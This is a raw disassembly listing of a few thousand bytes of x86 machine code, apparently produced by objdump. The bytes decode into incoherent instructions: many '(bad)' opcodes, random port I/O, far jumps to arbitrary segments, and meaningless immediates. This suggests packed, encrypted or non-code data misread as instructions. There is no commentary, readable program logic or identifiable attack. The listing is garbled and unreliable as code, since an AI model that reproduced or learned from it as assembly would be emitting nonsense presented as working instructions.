  41dfdb:	cs cmp ebx,edx
  41dfde:	rcr    BYTE PTR [esp],cl
  41dfe1:	call   0xbc662454
  41dfe6:	popa   
  41dfe7:	cmc    
  41dfe8:	sbb    eax,0x53e10065
  41dfed:	jmp    0x41dfe3
  41dfef:	sub    esi,DWORD PTR es:[ecx]
  41dff2:	cmc    
  41dff3:	sbb    al,0x91
  41dff5:	push   ecx
  41dff6:	push   0xd7b66661
  41dffb:	mov    ds:0x8c7664b5,eax
  41e000:	gs cld 
  41e002:	jmp    0x2b1207a9
  41e007:	clc    
  41e008:	dec    ebp
  41e009:	mov    bh,0xd3
  41e00b:	leave  
  41e00c:	xchg   ebx,eax
  41e00d:	and    bh,BYTE PTR [eax-0x218efae5]
  41e013:	ret    0x3e0e
  41e016:	ins    DWORD PTR es:[edi],dx
  41e017:	push   es
  41e018:	jmp    0x41dfd8
  41e01a:	daa    
  41e01b:	in     al,0x2c
  41e01d:	cmpxchg DWORD PTR [edi],esi
  41e020:	in     eax,0xa7
  41e022:	outs   dx,BYTE PTR ds:[esi]
  41e023:	sub    BYTE PTR [edx],bl
  41e025:	scas   eax,DWORD PTR es:[edi]
  41e026:	ja     0x41e055
  41e028:	pop    esp
  41e029:	(bad)  
  41e02a:	addr16 dec eax
  41e02c:	imul   ebx,DWORD PTR [ecx+ecx*1+0x5b],0x6c
  41e031:	addr16 xor al,0xe6
  41e034:	int3   
  41e035:	out    0xe5,eax
  41e037:	cmc    
  41e038:	loop   0x41e081
  41e03a:	rcl    BYTE PTR [ecx-0x51],1
  41e03d:	xlat   BYTE PTR ds:[ebx]
  41e03e:	retf   0xf352
  41e041:	ins    DWORD PTR es:[edi],dx
  41e042:	xchg   esi,eax
  41e043:	jl     0x41e016
  41e045:	inc    ebx
  41e046:	mov    fs:0x953de834,al
  41e04c:	push   es
  41e04d:	in     al,dx
  41e04e:	icebp  
  41e04f:	pusha  
  41e050:	mov    ds:0x8af18265,al
  41e055:	(bad)  
  41e056:	jo     0x41e07d
  41e058:	fprem  
  41e05a:	nop
  41e05b:	frstor [edi]
  41e05d:	fiadd  DWORD PTR [edi+0x79]
  41e060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e061:	(bad)
  41e064:	push   cs
  41e065:	neg    BYTE PTR [eax+0x46]
  41e068:	ins    BYTE PTR es:[edi],dx
  41e069:	stos   BYTE PTR es:[edi],al
  41e06a:	lahf   
  41e06b:	mov    cs,eax
  41e06d:	clc    
  41e06e:	adc    edx,DWORD PTR [esp+eax*1]
  41e071:	stos   DWORD PTR es:[edi],eax
  41e072:	test   eax,0xd233402d
  41e077:	inc    ebp
  41e078:	aas    
  41e079:	rcr    DWORD PTR [edi-0x44d6d6f9],cl
  41e07f:	cmp    ebx,DWORD PTR [edx+0x6731c68]
  41e085:	out    dx,al
  41e086:	and    ecx,DWORD PTR [ebx]
  41e088:	dec    edx
  41e089:	and    BYTE PTR ds:[ebx+0x35f6431f],ch
  41e090:	repz xor dh,BYTE PTR [ebp+0xabad088]
  41e097:	mov    ds:0x17a17ab9,eax
  41e09c:	cdq    
  41e09d:	out    0xe,al
  41e09f:	stos   DWORD PTR es:[edi],eax
  41e0a0:	call   DWORD PTR [ebp-0x46]
  41e0a3:	das    
  41e0a4:	adc    al,0xe2
  41e0a6:	inc    ecx
  41e0a7:	lahf   
  41e0a8:	lea    eax,[ebx+0x1f783acf]
  41e0ae:	pop    eax
  41e0af:	add    BYTE PTR [edi],0xcb
  41e0b2:	xchg   edx,eax
  41e0b3:	mov    ebx,DWORD PTR [esp+ecx*8-0x35]
  41e0b7:	scas   al,BYTE PTR es:[edi]
  41e0b8:	xor    DWORD PTR [edi-0x1036411c],edi
  41e0be:	or     DWORD PTR [edi+eax*2],ecx
  41e0c1:	mov    ah,dl
  41e0c3:	scas   eax,DWORD PTR es:[edi]
  41e0c4:	std    
  41e0c5:	adc    DWORD PTR [edx],edx
  41e0c7:	(bad)  
  41e0c8:	mov    dl,0x4
  41e0ca:	int    0x7f
  41e0cc:	dec    BYTE PTR [ebp-0x6e]
  41e0cf:	punpcklwd mm2,DWORD PTR [ecx+0x49]
  41e0d3:	shl    BYTE PTR [edx-0x4],1
  41e0d6:	jmp    0xbd89:0x4ca251df
  41e0dd:	cmp    ebp,DWORD PTR [ebx-0x7ce22a4d]
  41e0e3:	fld    TBYTE PTR [ecx+0xf]
  41e0e6:	loope  0x41e0e9
  41e0e8:	int3   
  41e0e9:	push   edi
  41e0ea:	in     al,0xce
  41e0ec:	xchg   esp,eax
  41e0ed:	mov    edx,0x4ca6c918
  41e0f2:	bound  esi,QWORD PTR [ecx+0x33]
  41e0f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0f6:	in     eax,0x7f
  41e0f8:	jb     0x41e0b0
  41e0fa:	rol    BYTE PTR [esi],0x3d
  41e0fd:	outs   dx,BYTE PTR ds:[esi]
  41e0fe:	mov    ebp,0xd966e8dd
  41e103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e104:	cs pop esp
  41e106:	mov    esi,0xe23a51f2
  41e10b:	arpl   WORD PTR [edx-0x1a],di
  41e10e:	cwde   
  41e10f:	ret    0xb40e
  41e112:	clc    
  41e113:	jbe    0x41e0ac
  41e115:	and    ecx,DWORD PTR [ecx-0x87cdd23]
  41e11b:	sbb    al,BYTE PTR [eax]
  41e11d:	cmc    
  41e11e:	mov    ds:0x252d10b7,al
  41e123:	add    DWORD PTR [edi+0x2f887e],esp
  41e129:	std    
  41e12a:	pop    es
  41e12b:	aaa    
  41e12c:	mov    ch,0x31
  41e12e:	jmp    0x6ab1a2b
  41e133:	rcr    BYTE PTR [ecx+0x3f0cb8e9],0x28
  41e13a:	add    al,0x49
  41e13c:	pop    eax
  41e13e:	int3   
  41e13f:	xchg   DWORD PTR ds:0xe4f45fda,esp
  41e145:	adc    eax,0xe0f0c504
  41e14a:	int    0xc6
  41e14c:	shl    DWORD PTR [edx+0x21a91db6],0xfc
  41e153:	lods   eax,DWORD PTR ds:[esi]
  41e154:	jmp    0x41e1a9
  41e156:	pop    esi
  41e157:	rol    DWORD PTR [ecx+0x45],1
  41e15a:	ja     0x41e195
  41e15c:	xor    bl,BYTE PTR [edi-0xc05d4cb]
  41e162:	std    
  41e163:	ret    
  41e164:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e165:	xor    al,0xff
  41e167:	or     ch,dh
  41e169:	test   DWORD PTR [ebx+edx*4],eax
  41e16c:	fsub   st(2),st
  41e16e:	inc    ebx
  41e16f:	sar    DWORD PTR [ecx+0x5058494c],cl
  41e175:	outs   dx,DWORD PTR ds:[esi]
  41e176:	iret   
  41e177:	sbb    BYTE PTR [esi+0x57],al
  41e17a:	adc    BYTE PTR [ecx-0x53b6cbd0],al
  41e180:	xor    eax,0x3a6c1f10
  41e185:	out    0xc0,al
  41e187:	scas   al,BYTE PTR es:[edi]
  41e188:	jmp    0x41e158
  41e18a:	mov    ch,0xf8
  41e18c:	call   DWORD PTR [eax+0x3918e1ae]
  41e192:	pop    esp
  41e193:	add    DWORD PTR [ecx+0x64d2818e],0x42
  41e19a:	out    dx,eax
  41e19b:	xor    eax,esi
  41e19d:	(bad)  
  41e19e:	jb     0x41e13d
  41e1a0:	loope  0x41e212
  41e1a2:	rol    DWORD PTR [ebx-0x4053821f],1
  41e1a8:	in     al,0x9c
  41e1aa:	repz fnstsw WORD PTR [ebp-0x20]
  41e1ae:	nop
  41e1af:	fld    TBYTE PTR [eax]
  41e1b1:	popa   
  41e1b2:	fidivr WORD PTR [eax+eiz*4+0x48]
  41e1b6:	pop    ebp
  41e1b7:	sahf   
  41e1b8:	(bad)  
  41e1b9:	repnz xor esp,0xffffff8f
  41e1bd:	pop    ebp
  41e1be:	cmp    esp,DWORD PTR [esi+0x2d0ce1db]
  41e1c4:	call   0x4e81a528
  41e1c9:	jmp    0x13b7f472
  41e1ce:	rcr    BYTE PTR [eax+0x4e0b086a],1
  41e1d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1d5:	push   eax
  41e1d6:	xor    BYTE PTR [esi],dl
  41e1d8:	push   ds
  41e1d9:	xchg   edi,eax
  41e1da:	jb     0x41e251
  41e1dc:	aaa    
  41e1dd:	push   cs
  41e1de:	cdq    
  41e1df:	stos   DWORD PTR es:[edi],eax
  41e1e0:	stc    
  41e1e1:	adc    edi,0x2f571126
  41e1e7:	ror    dl,1
  41e1e9:	push   edx
  41e1ea:	xor    DWORD PTR [ebp+0x42bf227f],0x54
  41e1f1:	stc    
  41e1f2:	or     al,0xab
  41e1f4:	outs   dx,DWORD PTR ds:[esi]
  41e1f5:	xchg   edx,eax
  41e1f6:	xchg   edi,eax
  41e1f7:	ins    BYTE PTR es:[edi],dx
  41e1f8:	mov    esi,0x8a59930c
  41e1fd:	sub    BYTE PTR [esi+0x60],ah
  41e200:	jb     0x41e25e
  41e202:	or     cl,bl
  41e204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e205:	fimul  DWORD PTR [esi]
  41e207:	jo     0x41e1e8
  41e209:	pop    ecx
  41e20a:	stos   DWORD PTR es:[edi],eax
  41e20b:	inc    esp
  41e20c:	mov    bh,0x86
  41e20e:	jmp    0xe07b:0xed4aecdf
  41e215:	test   esi,0x913f02a5
  41e21b:	inc    esi
  41e21c:	ret    0xd04f
  41e21f:	dec    esi
  41e220:	ds jp  0x41e25c
  41e223:	dec    edx
  41e224:	mov    eax,ds:0xf5ae6643
  41e229:	push   edi
  41e22a:	sbb    DWORD PTR [ebp-0x62847d87],edi
  41e230:	sbb    BYTE PTR [eax],dl
  41e232:	das    
  41e233:	aad    0x6
  41e235:	mov    eax,ds:0x4aebe9e5
  41e23a:	xor    ah,BYTE PTR ds:0x3f4b6545
  41e240:	(bad)  
  41e242:	leave  
  41e243:	lock sub al,BYTE PTR [ecx]
  41e246:	ss cmc 
  41e248:	ficomp DWORD PTR [edx]
  41e24a:	stos   BYTE PTR es:[edi],al
  41e24b:	inc    esp
  41e24c:	push   esp
  41e24d:	sbb    ecx,ebx
  41e24f:	and    eax,0x2d069904
  41e254:	adc    DWORD PTR [ecx+0x42],esp
  41e257:	push   ss
  41e258:	push   es
  41e259:	jns    0x41e1f2
  41e25b:	mov    cl,0x48
  41e25d:	test   BYTE PTR [eax+0x1],0x9
  41e261:	call   0x5713:0xa1b716b
  41e268:	ins    BYTE PTR es:[edi],dx
  41e269:	mov    ch,0xf0
  41e26b:	js     0x41e271
  41e26d:	push   ecx
  41e26e:	adc    eax,0x9b1ecc52
  41e273:	(bad)  
  41e275:	enter  0x8cb5,0x36
  41e279:	nop
  41e27a:	mov    ch,0x71
  41e27c:	call   0x9130:0x4c395219
  41e283:	jg     0x41e233
  41e285:	inc    edi
  41e286:	cmp    al,0x5f
  41e288:	out    dx,eax
  41e289:	mov    edi,0x77b017e9
  41e28e:	pop    edi
  41e28f:	(bad)  
  41e290:	and    bh,dh
  41e292:	sti    
  41e293:	push   eax
  41e294:	es call 0xbe916e9a
  41e29a:	scas   al,BYTE PTR es:[edi]
  41e29b:	push   ds
  41e29c:	loope  0x41e22a
  41e29e:	mov    ds:0xd5973ee8,eax
  41e2a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2a4:	cmovg  ecx,esi
  41e2a7:	pop    esi
  41e2a8:	out    0xe2,al
  41e2aa:	repz xor eax,0x623a790d
  41e2b0:	rcr    DWORD PTR [ebp+0x42],cl
  41e2b3:	adc    cl,cl
  41e2b5:	pop    ecx
  41e2b6:	adc    esp,DWORD PTR [ebx-0x67e213b5]
  41e2bc:	push   ds
  41e2bd:	loop   0x41e2ce
  41e2bf:	pop    eax
  41e2c0:	icebp  
  41e2c1:	jne    0x41e28b
  41e2c3:	jmp    0xf97a851f
  41e2c8:	jb     0x41e298
  41e2ca:	or     DWORD PTR [ebp-0x4dd98f90],0x4e
  41e2d1:	push   0x44
  41e2d3:	fmul   QWORD PTR [edi+edx*4-0x3f2b275f]
  41e2da:	lahf   
  41e2db:	and    al,0x82
  41e2dd:	mov    dl,0xeb
  41e2df:	popf   
  41e2e0:	fst    QWORD PTR [edx+0x71]
  41e2e3:	ss push ebx
  41e2e5:	jecxz  0x41e31b
  41e2e7:	pushf  
  41e2e8:	mov    ds:0x60dd5ec8,al
  41e2ed:	or     BYTE PTR [esi+0x64],cl
  41e2f0:	cmp    al,0xbc
  41e2f2:	sub    eax,0xa9495ece
  41e2f7:	std    
  41e2f8:	addr16 dec ebp
  41e2fa:	add    ah,BYTE PTR [esi-0x4c]
  41e2fd:	xchg   esp,eax
  41e2fe:	mov    al,es:0xe0638c4d
  41e304:	lods   eax,DWORD PTR ds:[esi]
  41e305:	mov    dl,0x72
  41e307:	jae    0x41e2fd
  41e309:	les    esi,FWORD PTR [esp+ecx*2-0x4f]
  41e30d:	mov    edx,0x69f7a5ce
  41e312:	or     DWORD PTR [edi],ebp
  41e314:	jno    0x41e30a
  41e316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e317:	and    al,BYTE PTR [esi+0x11]
  41e31a:	dec    esp
  41e31b:	enter  0x2ad5,0xae
  41e31f:	push   ds
  41e320:	int    0x53
  41e322:	dec    ebp
  41e323:	ins    BYTE PTR es:[edi],dx
  41e324:	add    DWORD PTR [ebx+0x1e7ed538],esi
  41e32a:	into   
  41e32b:	aaa    
  41e32c:	out    0x17,eax
  41e32e:	repz fild DWORD PTR [eax+eiz*1+0x3674bf3d]
  41e336:	add    ch,BYTE PTR [ebx-0x3d]
  41e339:	xor    ebx,DWORD PTR [edi-0x77d5cf50]
  41e33f:	inc    ecx
  41e340:	jmp    0x39191198
  41e345:	xchg   ebp,eax
  41e346:	retf   
  41e347:	test   al,al
  41e349:	jne    0x41e360
  41e34b:	add    eax,0xcbef42ab
  41e350:	adc    cl,0x81
  41e353:	out    dx,eax
  41e354:	int3   
  41e355:	sub    ebp,esp
  41e357:	dec    ecx
  41e358:	jp     0x41e308
  41e35a:	out    dx,al
  41e35b:	push   ebp
  41e35c:	out    dx,eax
  41e35d:	push   ss
  41e35e:	addr16 push edi
  41e360:	or     ecx,0x524b861
  41e366:	sub    cl,bh
  41e368:	pop    ss
  41e369:	adc    BYTE PTR [esp+eiz*2],0xd5
  41e36d:	cmp    eax,esp
  41e36f:	mov    dl,0x6b
  41e371:	popa   
  41e372:	adc    eax,0xdc802022
  41e377:	adc    eax,0xaea305e1
  41e37c:	addr16 sbb al,0x27
  41e37f:	cdq    
  41e380:	dec    ebx
  41e381:	xchg   ecx,eax
  41e382:	rol    cl,0x99
  41e385:	je     0x41e318
  41e387:	cwde   
  41e388:	pop    ebx
  41e389:	call   DWORD PTR [ebp+0x10]
  41e38c:	outs   dx,DWORD PTR ds:[esi]
  41e38d:	cmc    
  41e38e:	or     BYTE PTR [ebx-0x23daaa03],bl
  41e394:	lahf   
  41e395:	push   cs
  41e396:	add    eax,0x6f514610
  41e39b:	mov    ebp,DWORD PTR [bx+si]
  41e39e:	test   al,0x65
  41e3a0:	sub    eax,DWORD PTR [ecx-0x40bd1c57]
  41e3a6:	push   cx
  41e3a8:	xchg   esp,eax
  41e3a9:	jecxz  0x41e354
  41e3ab:	adc    eax,0xf1a8a407
  41e3b0:	mov    ds:0x85846250,eax
  41e3b5:	mov    bh,0x6b
  41e3b7:	not    DWORD PTR [eax+0x5d96981b]
  41e3bd:	xchg   ebx,eax
  41e3be:	dec    ebp
  41e3bf:	jg     0x41e35e
  41e3c1:	idiv   BYTE PTR [ebx-0x4a]
  41e3c4:	cmp    BYTE PTR [edi+esi*4],0x50
  41e3c8:	pop    esp
  41e3c9:	xor    BYTE PTR [ebx+0x7af71ee1],dh
  41e3cf:	and    edx,DWORD PTR [edx]
  41e3d1:	std    
  41e3d2:	js     0x41e430
  41e3d4:	push   edi
  41e3d5:	jns    0x41e40f
  41e3d7:	into   
  41e3d8:	push   ss
  41e3d9:	(bad)  [ebx]
  41e3db:	sbb    al,0xf9
  41e3dd:	inc    edx
  41e3de:	loopne 0x41e38b
  41e3e0:	mov    ebx,0xd6525ec0
  41e3e5:	xor    BYTE PTR [ecx-0x55],0x3
  41e3e9:	sbb    BYTE PTR [eax],bh
  41e3eb:	or     DWORD PTR [esi+esi*2-0x63],edx
  41e3ef:	dec    ecx
  41e3f0:	iretw  
  41e3f2:	test   al,0x33
  41e3f4:	js     0x41e3bc
  41e3f6:	jnp    0x41e405
  41e3f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3f9:	bound  eax,QWORD PTR ds:0x8a4e1f68
  41e3ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e400:	or     DWORD PTR [esi-0x68],edi
  41e403:	push   edx
  41e404:	sbb    esp,DWORD PTR [esi]
  41e406:	push   eax
  41e407:	popf   
  41e408:	enter  0x981b,0x2a
  41e40c:	mov    eax,ds:0x8a2fb97a
  41e411:	sbb    ecx,DWORD PTR [edx+0x6602165b]
  41e417:	xchg   edx,eax
  41e418:	and    ecx,DWORD PTR [esi+eiz*2-0x2d]
  41e41c:	lock pop es
  41e41e:	push   eax
  41e41f:	mov    ebp,0x14469d8
  41e424:	jns    0x41e485
  41e426:	add    cl,BYTE PTR [esi+0x30e35ff0]
  41e42c:	(bad)  
  41e42d:	ins    BYTE PTR es:[edi],dx
  41e42e:	cmp    DWORD PTR [ecx+0x649784bb],esi
  41e434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e435:	cld    
  41e436:	cmp    eax,0x72c8561b
  41e43b:	imul   eax,DWORD PTR [edi],0x88bb519
  41e441:	fbld   TBYTE PTR [eax+0x7]
  41e444:	mov    dh,BYTE PTR [ebx+0x4ce3844b]
  41e44a:	xchg   edx,eax
  41e44b:	cmp    esi,DWORD PTR [ebp+0x7b7521fd]
  41e451:	push   0xac2fd817
  41e456:	imul   esp,esp,0x74c3f746
  41e45c:	shl    DWORD PTR [ebx+0x668db08],1
  41e462:	mov    edx,DWORD PTR [ebp-0x1e3d4b78]
  41e468:	jae    0x41e420
  41e46a:	xor    bh,BYTE PTR [esi+0x4ff3891d]
  41e470:	xchg   BYTE PTR [edx],dh
  41e472:	lods   eax,DWORD PTR ds:[esi]
  41e473:	sti    
  41e474:	fild   WORD PTR [eax-0x7c]
  41e477:	cmp    BYTE PTR [esi+0x4e],0x72
  41e47b:	out    dx,eax
  41e47c:	pop    eax
  41e47d:	xor    bl,BYTE PTR ss:0xcc117be8
  41e484:	sub    eax,0xb2773ec9
  41e489:	push   esp
  41e48a:	cli    
  41e48b:	int3   
  41e48c:	add    bh,BYTE PTR [esi]
  41e48e:	jge    0x41e4f1
  41e490:	or     dh,ah
  41e492:	scas   al,BYTE PTR es:[edi]
  41e493:	ins    DWORD PTR es:[edi],dx
  41e494:	mov    ebp,0x83dc53bf
  41e499:	inc    edx
  41e49a:	cmp    dh,BYTE PTR [edx+ecx*8-0x211b556e]
  41e4a1:	stc    
  41e4a2:	dec    ecx
  41e4a3:	test   ebx,0x1efa69f
  41e4a9:	sbb    BYTE PTR [ebx-0x49],ch
  41e4ac:	mov    esp,ss
  41e4ae:	scas   eax,DWORD PTR es:[edi]
  41e4af:	clc    
  41e4b0:	cmc    
  41e4b1:	jecxz  0x41e475
  41e4b3:	pushf  
  41e4b4:	mov    dl,0x1f
  41e4b6:	out    0x8a,al
  41e4b8:	mov    cl,0x37
  41e4ba:	inc    ecx
  41e4bb:	jmp    0x41e4ff
  41e4bd:	and    al,0xed
  41e4bf:	es mov edx,0xf6309910
  41e4c5:	mov    dh,0xe1
  41e4c7:	mov    bl,0xb1
  41e4c9:	dec    eax
  41e4ca:	mov    bl,0x86
  41e4cc:	dec    edx
  41e4cd:	mov    gs,WORD PTR [ebp+0x20]
  41e4d0:	adc    eax,0xc825daf0
  41e4d5:	lods   al,BYTE PTR ds:[esi]
  41e4d6:	sbb    DWORD PTR [edx-0x12555ec0],ebp
  41e4dc:	call   DWORD PTR [ebp+edx*1+0x10]
  41e4e0:	fsub   DWORD PTR [ebx]
  41e4e2:	addr16 push ebp
  41e4e4:	jmp    0x175c:0x6e94e49f
  41e4eb:	sub    ch,0x3a
  41e4ee:	cmp    DWORD PTR ds:0xdafdf9ef,ebp
  41e4f4:	jmp    0x189e7a8b
  41e4f9:	fsub   st(4),st
  41e4fb:	pop    ds
  41e4fc:	ss mov cl,0xe5
  41e4ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e500:	loope  0x41e525
  41e502:	dec    edi
  41e503:	sbb    ebx,DWORD PTR fs:[edi]
  41e506:	je     0x41e547
  41e508:	jno    0x41e4dd
  41e50a:	cwde   
  41e50b:	test   al,0x57
  41e50d:	ins    DWORD PTR es:[edi],dx
  41e50e:	sub    BYTE PTR [edx-0x4e],bl
  41e511:	mov    eax,ds:0xe9eb0d24
  41e516:	dec    BYTE PTR [edx+0x72ffd455]
  41e51c:	cld    
  41e51d:	std    
  41e51e:	and    al,0x99
  41e520:	ss call 0xccd7f228
  41e526:	(bad)  
  41e527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e528:	cmc    
  41e529:	lods   eax,DWORD PTR ds:[esi]
  41e52a:	mov    ebx,0xdd537ca5
  41e52f:	fincstp 
  41e531:	pop    eax
  41e532:	cmp    eax,0xc6cc579b
  41e537:	add    BYTE PTR [eax+eax*8+0x4c],bl
  41e53b:	mov    dl,0x30
  41e53d:	ss mov bl,0x53
  41e540:	dec    ebx
  41e541:	push   ss
  41e542:	sbb    edx,0xffffffc6
  41e545:	lock add edi,DWORD PTR [ecx+edi*2+0x6e]
  41e54a:	jle    0x41e4e7
  41e54c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e54d:	jg     0x41e4ec
  41e54f:	jg     0x41e5ab
  41e551:	push   ds
  41e552:	sub    ebp,DWORD PTR [eax+0x1d]
  41e555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e556:	out    0x35,al
  41e558:	imul   edi,ebp,0x2132d4da
  41e55e:	cli    
  41e55f:	into   
  41e560:	int3   
  41e561:	repz pop edx
  41e563:	scas   eax,DWORD PTR es:[edi]
  41e564:	push   ds
  41e565:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e566:	popa   
  41e567:	je     0x41e515
  41e569:	add    DWORD PTR [ebp+edx*4+0xf599e62],eax
  41e570:	mov    eax,ds:0xf8e93ec6
  41e575:	fcomp  DWORD PTR [ecx-0x8]
  41e578:	jmpw   0x2fbf
  41e57c:	add    eax,0x4710bf9b
  41e581:	rol    DWORD PTR [esi+0x12],1
  41e584:	push   eax
  41e585:	pop    es
  41e586:	pop    eax
  41e587:	adc    al,0x2f
  41e589:	in     al,dx
  41e58a:	add    DWORD PTR ds:0xcfb91db8,edx
  41e590:	in     eax,dx
  41e591:	pop    edx
  41e592:	push   cs
  41e593:	xor    DWORD PTR [ebp-0x1e],ecx
  41e596:	ja     0x41e5b7
  41e598:	dec    edi
  41e599:	and    DWORD PTR [edi],ecx
  41e59b:	xchg   esp,eax
  41e59c:	mov    edi,0xfc6c2498
  41e5a1:	mov    edi,0xd6daae32
  41e5a6:	adc    edx,edi
  41e5a8:	pop    esp
  41e5a9:	outs   dx,DWORD PTR ds:[esi]
  41e5aa:	dec    esi
  41e5ab:	jge    0x41e59f
  41e5ad:	adc    ebp,DWORD PTR [eax+0x4be4a1f2]
  41e5b3:	and    BYTE PTR [edx-0x79f73e08],al
  41e5b9:	dec    ebp
  41e5ba:	aaa    
  41e5bb:	push   ebp
  41e5bc:	mov    edi,0xf5fead56
  41e5c1:	aas    
  41e5c2:	pop    edi
  41e5c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5c4:	or     ch,BYTE PTR [eax]
  41e5c6:	bound  ecx,QWORD PTR [ebp-0x3c84de85]
  41e5cc:	retf   0xeb5
  41e5cf:	jbe    0x41e646
  41e5d1:	push   ebx
  41e5d2:	retf   
  41e5d3:	sahf   
  41e5d4:	into   
  41e5d5:	mov    BYTE PTR [edi],al
  41e5d7:	aam    0xcd
  41e5d9:	iret   
  41e5da:	push   edi
  41e5db:	es ins BYTE PTR es:[edi],dx
  41e5dd:	lock or BYTE PTR [esi-0x27],al
  41e5e1:	push   0xd72f8b03
  41e5e6:	mov    edx,0x1a1853ed
  41e5eb:	stos   DWORD PTR es:[edi],eax
  41e5ec:	outs   dx,DWORD PTR ds:[esi]
  41e5ed:	push   ebx
  41e5ee:	js     0x41e580
  41e5f0:	mov    cl,0xcb
  41e5f2:	ret    
  41e5f3:	xchg   edx,eax
  41e5f4:	into   
  41e5f5:	push   edx
  41e5f6:	div    BYTE PTR [edx-0x76]
  41e5f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5fa:	cmp    cl,BYTE PTR [edi+0x46]
  41e5fd:	sub    eax,0xb18c75af
  41e602:	mov    dh,0xb7
  41e604:	adc    dh,BYTE PTR [ebx+ebp*1]
  41e607:	retf   
  41e608:	addr16 jg 0x41e5c3
  41e60b:	scas   eax,DWORD PTR es:[edi]
  41e60c:	sub    DWORD PTR [bx+di+0x67],ebp
  41e610:	out    0x11,eax
  41e612:	(bad)  
  41e613:	jg     0x41e602
  41e615:	dec    esp
  41e616:	cmp    ecx,DWORD PTR [eax]
  41e618:	inc    ecx
  41e619:	out    dx,eax
  41e61a:	rcl    DWORD PTR [eax+0x1e],cl
  41e61d:	fdiv   DWORD PTR [edi-0x1a]
  41e620:	sbb    edi,DWORD PTR [eax+0x69]
  41e623:	inc    esi
  41e624:	cmp    bh,BYTE PTR [esi+edi*1-0x80]
  41e628:	adc    eax,0xdffdfdb2
  41e62d:	xlat   BYTE PTR ds:[ebx]
  41e62e:	ror    DWORD PTR [eax+0x7b],0xd1
  41e632:	xor    DWORD PTR [edx+0x49cf9953],0x2c
  41e639:	and    edx,DWORD PTR [esi]
  41e63b:	xchg   edi,eax
  41e63c:	out    dx,al
  41e63d:	xor    al,0x60
  41e63f:	sub    bl,BYTE PTR [esi]
  41e641:	das    
  41e642:	push   0x821b075c
  41e647:	lods   al,BYTE PTR ds:[esi]
  41e648:	mov    ch,0x48
  41e64a:	outs   dx,BYTE PTR ds:[esi]
  41e64b:	aad    0x81
  41e64d:	std    
  41e64e:	xor    al,0xe7
  41e650:	ja     0x41e651
  41e652:	sub    DWORD PTR [ecx],0xfffffffa
  41e655:	xchg   DWORD PTR [ebx+ebp*4],ebp
  41e658:	adc    dl,dl
  41e65a:	pop    esi
  41e65b:	fs fs popw ds
  41e65f:	ins    BYTE PTR es:[edi],dx
  41e660:	test   eax,0x295b3756
  41e665:	adc    dl,ah
  41e667:	in     eax,dx
  41e668:	jb     0x41e6d0
  41e66a:	pop    ecx
  41e66b:	jecxz  0x41e6cb
  41e66d:	xor    ebx,ebx
  41e66f:	data16 int3 
  41e671:	bound  eax,QWORD PTR [ebx+0x52bd9387]
  41e677:	push   esi
  41e678:	mov    eax,ds:0x374204ce
  41e67d:	sbb    DWORD PTR [ebp*4-0x2506e01],edi
  41e684:	shl    BYTE PTR [ecx-0x2822dad1],1
  41e68a:	test   BYTE PTR [ecx-0x34],dl
  41e68d:	in     eax,dx
  41e68e:	rcl    DWORD PTR [ebx+edx*4-0x66f5b8cd],cl
  41e695:	mov    DWORD PTR [ebp+0x75],eax
  41e698:	arpl   WORD PTR [esi],dx
  41e69a:	pop    es
  41e69b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e69c:	cli    
  41e69d:	(bad)  
  41e69f:	out    0x45,eax
  41e6a1:	or     bh,BYTE PTR [esp+edx*4]
  41e6a4:	mov    dl,BYTE PTR [ecx]
  41e6a6:	repnz sbb DWORD PTR [ebp-0x36],ecx
  41e6aa:	lods   al,BYTE PTR ds:[esi]
  41e6ab:	push   ds
  41e6ac:	gs nop
  41e6ae:	cmc    
  41e6af:	fdivr  DWORD PTR [edx-0x4b9ccbbc]
  41e6b5:	xchg   edi,eax
  41e6b6:	test   eax,0xe9f16af
  41e6bb:	jecxz  0x41e6d0
  41e6bd:	outs   dx,DWORD PTR ds:[esi]
  41e6be:	push   0xffffffe2
  41e6c0:	add    eax,0x508d31d1
  41e6c5:	sahf   
  41e6c6:	scas   eax,DWORD PTR es:[edi]
  41e6c7:	cli    
  41e6c8:	or     eax,0x9ce2d800
  41e6cd:	loope  0x41e67f
  41e6cf:	fs shr DWORD PTR gs:[eax+0x71],0x92
  41e6d5:	mov    bh,0xff
  41e6d7:	pop    es
  41e6d8:	dec    esi
  41e6d9:	cmp    al,dl
  41e6db:	mov    ds:0xd85db3ba,al
  41e6e0:	(bad)  
  41e6e1:	arpl   WORD PTR ds:0x7d68e402,sp
  41e6e7:	sub    eax,0xc3fd174f
  41e6ec:	and    eax,0x7d283c89
  41e6f1:	fwait
  41e6f2:	jae    0x41e749
  41e6f4:	cdq    
  41e6f5:	(bad)  
  41e6f6:	xchg   edi,eax
  41e6f7:	repz sub ebp,DWORD PTR [ecx-0x34]
  41e6fb:	lods   al,BYTE PTR ds:[esi]
  41e6fc:	jmp    0x41e680
  41e6fe:	scas   al,BYTE PTR es:[edi]
  41e6ff:	loope  0x41e681
  41e701:	aaa    
  41e702:	arpl   sp,bp
  41e704:	out    0x7c,al
  41e706:	pop    eax
  41e707:	in     al,0x98
  41e709:	add    eax,0x1f10e7b4
  41e70e:	push   edx
  41e70f:	cs sti 
  41e711:	xchg   ebx,eax
  41e712:	jo     0x41e70a
  41e714:	mov    dh,0xb8
  41e716:	sub    dl,bh
  41e718:	(bad)  
  41e719:	lods   al,BYTE PTR ds:[esi]
  41e71a:	push   edi
